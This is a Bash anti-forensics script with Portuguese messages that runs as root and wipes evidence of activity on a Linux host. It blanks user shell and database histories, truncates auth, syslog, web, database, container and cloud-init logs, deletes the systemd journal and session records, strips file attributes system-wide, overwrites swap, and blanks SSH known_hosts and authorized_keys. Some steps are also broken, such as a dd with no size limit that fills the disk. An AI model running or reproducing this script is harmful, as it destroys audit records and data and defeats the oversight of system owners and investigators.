#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo -e "\e[31m[!] Este script precisa ser executado como root!\e[0m"
    exit 1
fi

echo -e "\e[32m[+] Limpando rastros do usuário $USER...\e[0m"
echo "" > ~/.bash_history
echo "" > ~/.zsh_history 2>/dev/null
echo "" > ~/.viminfo 2>/dev/null
echo "" > ~/.nvimlog 2>/dev/null
echo "" > ~/.local/share/nvim/shada/* 2>/dev/null
echo "" > ~/.mysql_history 2>/dev/null
echo "" > ~/.psql_history 2>/dev/null
history -c && history -w

echo -e "\e[32m[+] Limpando logs do sistema...\e[0m"
log_files=(
    "/var/log/auth.log" "/var/log/syslog" "/var/log/messages"
    "/var/log/secure" "/var/log/utmp" "/var/log/wtmp"
    "/var/log/lastlog" "/var/log/btmp" "/var/log/faillog"
    
    "/var/log/cron.log" "/var/log/mail.log" "/var/log/boot.log"
    "/var/log/dpkg.log" "/var/log/apt/history.log"
    
    "/var/log/apache2/access.log" "/var/log/apache2/error.log"
    "/var/log/nginx/access.log" "/var/log/nginx/error.log"
    
    "/var/log/mysql.log" "/var/log/mysql/error.log"
    "/var/log/postgresql.log"
    
    "/var/log/docker.log" "/var/log/containers/*.log"
    
    "/var/log/cloud-init.log" "/var/log/cloud-init-output.log"
)

for file in "${log_files[@]}"; do
    if [ -f "$file" ] || [ -d "$file" ]; then
        echo -e "\e[34m[*] Limpando: $file\e[0m"
        echo "" > "$file" 2>/dev/null || rm -rf "$file/*" 2>/dev/null
    fi
done

echo -e "\e[32m[+] Limpando registros de sessões...\e[0m"
utmpdump /var/log/wtmp > /tmp/wtmp.tmp && mv /tmp/wtmp.tmp /var/log/wtmp 2>/dev/null
utmpdump /var/log/btmp > /tmp/btmp.tmp && mv /tmp/btmp.tmp /var/log/btmp 2>/dev/null
echo "" > /var/log/lastlog 2>/dev/null

echo -e "\e[32m[+] Limpando caches e arquivos temporários...\e[0m"
rm -rf ~/.cache/* 2>/dev/null
rm -rf /var/cache/* 2>/dev/null
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null

if command -v journalctl &>/dev/null; then
    echo -e "\e[32m[+] Limpando journal logs...\e[0m"
    journalctl --flush --rotate 2>/dev/null
    journalctl --vacuum-time=1s 2>/dev/null
    rm -rf /var/log/journal/* 2>/dev/null
fi

echo -e "\e[32m[+] Limpando metadados e swap...\e[0m"
find / -type f -exec setfattr -x user.* {} \; 2>/dev/null
swapoff -a 2>/dev/null && dd if=/dev/zero of=/swapfile bs=1M 2>/dev/null
mkswap /swapfile 2>/dev/null && swapon -a 2>/dev/null

echo -e "\e[32m[+] Limpando rastros do SSH...\e[0m"
echo "" > ~/.ssh/known_hosts 2>/dev/null
echo "" > ~/.ssh/authorized_keys 2>/dev/null

echo -e "\e[33m\n[!] Limpeza concluída!\n\e[0m"
